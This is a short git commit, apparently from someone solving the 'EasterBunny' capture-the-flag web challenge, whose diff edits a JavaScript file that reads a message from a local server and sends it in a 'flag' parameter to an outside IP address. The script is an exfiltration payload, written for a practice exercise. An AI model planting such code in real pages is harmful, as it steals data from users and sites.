28170182e63ed4eab2ca30fb4938412ea9c50f49
Zhang, Shunda <zhangshunda@gmail.com>
2023-04-14 12:41:44 +0000

    Solving EasterBunny...

--- ctf/web/EasterBunny/static/viewletter.js
+++ ctf/web/EasterBunny/static/viewletter.js
@@ -3,7 +3,7 @@ const loadLetter = () => {
   fetch('http://127.0.0.1/message/3')
     .then(response => response.json())
     .then(data => {
-      fetch('http://178.62.102.205:80?flag=' + data.message);
+      fetch('http://178.62.102.205?flag=' + data.message);
 });
 };
 loadLetter();
